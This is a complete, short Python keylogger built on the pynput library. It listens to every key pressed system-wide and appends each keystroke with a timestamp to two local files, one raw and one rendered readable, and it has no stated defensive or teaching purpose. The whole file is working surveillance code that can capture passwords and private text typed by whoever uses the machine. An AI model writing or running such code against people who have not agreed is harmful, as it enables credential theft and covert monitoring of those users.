import pynput
import datetime
from pynput.keyboard import Key, Listener


def on_press(key):
	keys = []
	keys.append(key)
	current_date_time = datetime.datetime.now()
	write_readable_file(keys, current_date_time)
	write_log_file(keys, current_date_time)
	keys  = []


def write_log_file(keys, current_date_time):
	with open("log.text", "a") as file:
		for key in keys:
			file.write(str(key))
			file.write(str(current_date_time))
			file.write("\n")

def write_readable_file(keys, date_time):
	with open("keys.text", "a") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write(" ")
				file.write(str(date_time))
				file.write('\n')
			elif k.find("Key") == -1:
				file.write(k)
def main():
	with Listener(on_press=on_press) as listener:
		listener.join()

if __name__ == '__main__':
	main()